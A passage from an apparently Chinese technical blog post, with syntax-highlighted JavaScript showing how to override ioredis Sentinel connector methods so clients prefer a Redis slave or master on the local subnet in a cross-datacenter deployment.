selectedSlave = _.sample(localSlaves.length ? localSlaves : remoteSl<span style=\"text-decoration: underline;\">aves);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   local_node = Boolean(localSlaves.length);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.warn(<span style=\"color: #66cccc;\">'redis('</span> + JSON.stringify({name: self.options.name, db: sel<span style=\"text-decoration: underline;\">f.options.db, sentinels: self.options.sentinels}) + </span><span style=\"color: #66cccc; text-decoration: underline;\">') resolve slave to'</span><span style=\"text-decoration: underline;\"> + (local_node ? </span><span style=\"color: #66cccc; text-decoration: underline;\">' local'</span><span style=\"text-decoration: underline;\"> : </span><span style=\"color: #66cccc; text-decoration: underline;\">''</span><span style=\"text-decoration: underline;\">) + </span><span style=\"color: #66cccc; text-decoration: underline;\">': '</span><span style=\"text-decoration: underline;\"> + selectedSlave.ip + </span><span style=\"color: #66cccc; text-decoration: underline;\">':'</span><span style=\"text-decoration: underline;\"> + selectedSlave.port);</span>\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   callback(<span style=\"color: #6699cc;\">null</span>, selectedSlave ? { host: selectedSlave.ip, port: selectedS<span style=\"text-decoration: underline;\">lave.port, local_node: local_node } : </span><span style=\"color: #6699cc; text-decoration: underline;\">null</span><span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n};\n\n<span style=\"color: #999999; font-style: italic;\">/**</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">* Prefer connect to local slave.</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">*</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">* </span><span style=\"color: #99cc99; font-style: italic;\">@param</span><span style=\"color: #999999; font-style: italic;\"> </span><span style=\"color: #ffcc66; font-style: italic;\">client</span><span style=\"color: #999999; font-style: italic;\"> redis client.</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">*</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">* </span><span style=\"color: #99cc99; font-style: italic;\">@return</span><span style=\"color: #999999; font-style: italic;\"> is this change successful.</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">*/</span>\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">preferLocalSlave</span>(<span style=\"color: #ffcc66;\">client</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (client.options.role === <span style=\"color: #66cccc;\">'slave'</span> &amp;&amp; client.connector.resolveSlave) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (client.options.lazyConnect &amp;&amp; client.status == <span style=\"color: #66cccc;\">'wait'</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.connector.resolveSlave = resolveSlavePreferLocal;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> <span style=\"color: #6699cc;\">true</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.warn(<span style=\"color: #66cccc;\">'redis client('</span> + JSON.stringify({name: client.options.name<span style=\"text-decoration: underline;\">, db: client.options.db, sentinels: client.options.sentinels}) + </span><span style=\"color: #66cccc; text-decoration: underline;\">') status unexpected'</span><span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> <span style=\"color: #6699cc;\">false</span>;\n}\n</pre>\n</div>\n\n<p>\n用法如下\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">options</span> = {name: <span style=\"color: #66cccc;\">\"data\"</span>, sentinels: sentinels, db: 0, role: <span style=\"color: #66cccc;\">\"slave\"</span>, lazyCon<span style=\"text-decoration: underline;\">nect: </span><span style=\"color: #6699cc; text-decoration: underline;\">true</span><span style=\"text-decoration: underline;\">}</span>\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">client</span> = <span style=\"color: #99cc99;\">new</span> <span style=\"color: #6699cc;\">Redis</span>(options);\n<span style=\"color: #99cc99;\">if</span> (preferLocalSlave(client)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.warn(<span style=\"color: #66cccc;\">\"prefer local slave on redis sentinel(\"</span> + JSON.stringify(option<span style=\"text-decoration: underline;\">s) + </span><span style=\"color: #66cccc; text-decoration: underline;\">\")\"</span><span style=\"text-decoration: underline;\">);</span>\n}\n</pre>\n</div>\n\n<p>\n值得注意的是必须指定 <code>lazyConnect: true</code> ，这样才能通过替换 client 中的方法实现功能。 \n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">优先选择本地结点</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n假设 redis 是以 1 Master + 1 Slave 方式进行跨机房部署，那么我们希望实现优先连接本地结点（忽略其角色），\n连接成功后该连接可能是 Master 也可能是 Slave，我们把它当 Slave 用准没错。\n</p>\n\n<p>\n在上一节的基础上，实现如下\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #999999; font-style: italic;\">/**</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">* A SentinelConnector.prototype.resolveMaster replacement, indicate the resolve</span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">d node is local node.</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">*</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">* </span><span style=\"color: #99cc99; font-style: italic;\">@param</span><span style=\"color: #999999; font-style: italic;\"> </span><span style=\"color: #ffcc66; font-style: italic;\">client</span><span style=\"color: #999999; font-style: italic;\"> redis client.</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">* </span><span style=\"color: #99cc99; font-style: italic;\">@param</span><span style=\"color: #999999; font-style: italic;\"> </span><span style=\"color: #ffcc66; font-style: italic;\">callback</span><span style=\"color: #999999; font-style: italic;\"> function (err, master) called when done.</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">*                 master with a extra boolean field \"local_node\" to indicate ma</span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">ster is in local network.</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">*</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">*/</span>\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">resolveMasterPreferLocal</span> (<span style=\"color: #ffcc66;\">client</span>, <span style=\"color: #ffcc66;\">callback</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.sentinel(<span style=\"color: #66cccc;\">'get-master-addr-by-name'</span>, <span style=\"color: #6699cc;\">this</span>.options.name, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">err</span>,<span style=\"text-decoration: underline;\"> </span><span style=\"color: #ffcc66; text-decoration: underline;\">result</span><span style=\"text-decoration: underline;\">) {</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (err) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.disconnect();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> callback(err);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">localIP</span> = client.stream.localAddress;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.disconnect();\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">localIPSegments</span> = <span style=\"color: #99cc99;\">new</span> <span style=\"color: #6699cc;\">Array</span>(4);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (net.isIPv4(localIP)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   localIPSegments = localIP.split(<span style=\"color: #66cccc;\">'.'</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">local_node</span> = <span style=\"color: #6699cc;\">false</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (Array.isArray(result)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">ip</span> = result[0];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (net.isIPv4(ip)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">ipSegments</span> = ip.split(<span style=\"color: #66cccc;\">'.'</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (localIPSegments[0] === ipSegments[0] &amp;&amp;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   localIPSegments[1] === ipSegments[1] &amp;&amp;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   localIPSegments[2] === ipSegments[2]) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   local_node = <span style=\"color: #6699cc;\">true</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   callback(<span style=\"color: #6699cc;\">null</span>, Array.isArray(result) ? { host: result[0], port: result[1<span style=\"text-decoration: underline;\">], local_node: local_node } : </span><span style=\"color: #6699cc; text-decoration: underline;\">null</span><span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n};\n\n<span style=\"color: #999999; font-style: italic;\">/**</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">* A SentinelConnector.prototype.resolve replacement, prefer resolve to local no</span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">de.</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">*</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">* </span><span style=\"color: #99cc99; font-style: italic;\">@param</span><span style=\"color: #999999; font-style: italic;\"> </span><span style=\"color: #ffcc66; font-style: italic;\">endpoint</span><span style=\"color: #999999; font-style: italic;\"> sentinel endpoint to connect.</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">* </span><span style=\"color: #99cc99; font-style: italic;\">@param</span><span style=\"color: #999999; font-style: italic;\"> </span><span style=\"color: #ffcc66; font-style: italic;\">callback</span><span style=\"color: #999999; font-style: italic;\"> function (err, node) called when done.</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">*                 node with a extra boolean field \"local_node\" to indicate node</span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\"> is in local network.</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">*</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">*/</span>\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">resolvePreferLocal</span>(<span style=\"color: #ffcc66;\">endpoint</span>, <span style=\"color: #ffcc66;\">callback</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   assert(<span style=\"color: #6699cc;\">this</span>.options.role === <span style=\"color: #66cccc;\">'slave'</span>);\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">client</span> = <span style=\"color: #99cc99;\">new</span> <span style=\"color: #6699cc;\">Redis</span>({\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   port: endpoint.port,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   host: endpoint.host,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   retryStrategy: <span style=\"color: #6699cc;\">null</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   enableReadyCheck: <span style=\"color: #6699cc;\">false</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   connectTimeout: <span style=\"color: #6699cc;\">this</span>.options.connectTimeout\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">self</span> = <span style=\"color: #6699cc;\">this</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">this</span>.resolveSlave(client, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">slave_err</span>, <span style=\"color: #ffcc66;\">slave</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (slave_err || !slave ||!slave.local_node) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (slave_err) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.error(<span style=\"color: #66cccc;\">'redis('</span> + JSON.stringify({name: self.options.name<span style=\"text-decoration: underline;\">, db: self.options.db, sentinels: self.options.sentinels}) + </span><span style=\"color: #66cccc; text-decoration: underline;\">') resolve slave error('</span><span style=\"text-decoration: underline;\"> + slave_err.toString() + </span><span style=\"color: #66cccc; text-decoration: underline;\">')'</span><span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client = <span style=\"color: #99cc99;\">new</span> <span style=\"color: #6699cc;\">Redis</span>({\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   port: endpoint.port,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   host: endpoint.host,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   retryStrategy: <span style=\"color: #6699cc;\">null</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   enableReadyCheck: <span style=\"color: #6699cc;\">false</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   connectTimeout: self.options.connectTimeout\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> self.resolveMaster(client, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">master_err</span>, <span style=\"color: #ffcc66;\">master</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (master_err) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.error(<span style=\"color: #66cccc;\">'redis('</span> + JSON.stringify({name: self.options.<span style=\"text-decoration: underline;\">name, db: self.options.db, sentinels: self.options.sentinels}) + </span><span style=\"color: #66cccc; text-decoration: underline;\">') resolve master error('</span><span style=\"text-decoration: underline;\"> + master_err.toString() + </span><span style=\"color: #66cccc; text-decoration: underline;\">')'</span><span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (!master_err &amp;&amp; master &amp;&amp; master.local_node) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.warn(<span style=\"color: #66cccc;\">'redis('</span> + JSON.stringify({name: self.options.n<span style=\"text-decoration: underline;\">ame, db: self.options.db, sentinels: self.options.sentinels}) + </span><span style=\"color: #66cccc; text-decoration: underline;\">') resolve slave to local master: '</span><span style=\"text-decoration: underline;\"> + master.host + </span><span style=\"color: #66cccc; text-decoration: underline;\">':'</span><span style=\"text-decoration: underline;\"> + master.port);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> callback(<span style=\"color: #6699cc;\">null</span>, master);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } <span style=\"color: #99cc99;\">else</span> <span style=\"color: #99cc99;\">if</span> (slave || master) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> callback(<span style=\"color: #6699cc;\">null</span>, slave || master);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> callback(slave_err || master_err, <span style=\"color: #6699cc;\">null</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } <span style=\"color: #99cc99;\">else</span> {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> callback(<span style=\"color: #6699cc;\">null</span>, slave);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n}\n\n<span style=\"color: #999999; font-style: italic;\">/**</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">* A SentinelConnector.prototype.check replacement, enable connect local master </span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">when connect to slave.</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">*/</span>\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">checkPreferLocal</span>(<span style=\"color: #ffcc66;\">info</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> <span style=\"color: #6699cc;\">true</span>;\n}\n\n<span style=\"color: #999999; font-style: italic;\">/**</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">* Prefer connect to local redis node, slave first.</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">*</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">* </span><span style=\"color: #99cc99; font-style: italic;\">@param</span><span style=\"color: #999999; font-style: italic;\"> </span><span style=\"color: #ffcc66; font-style: italic;\">client</span><span style=\"color: #999999; font-style: italic;\"> redis client.</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">*</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">* </span><span style=\"color: #99cc99; font-style: italic;\">@return</span><span style=\"color: #999999; font-style: italic;\"> is this change successful.</span>\n<span style=\"color: #999999; background-color: #2d2d2d; font-style: italic;\"> </span><span style=\"color: #999999; font-style: italic;\">*/</span>\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">preferLocal</span>(<span style=\"color: #ffcc66;\">client</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (client.options.role === <span style=\"color: #66cccc;\">'slave'</span> &amp;&amp; client.connector.resolveSlave) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (client.options.lazyConnect &amp;&amp; client.status == <span style=\"color: #66cccc;\">'wait'</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (client.connector.resolveSlave != resolveSlavePreferLocal) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: 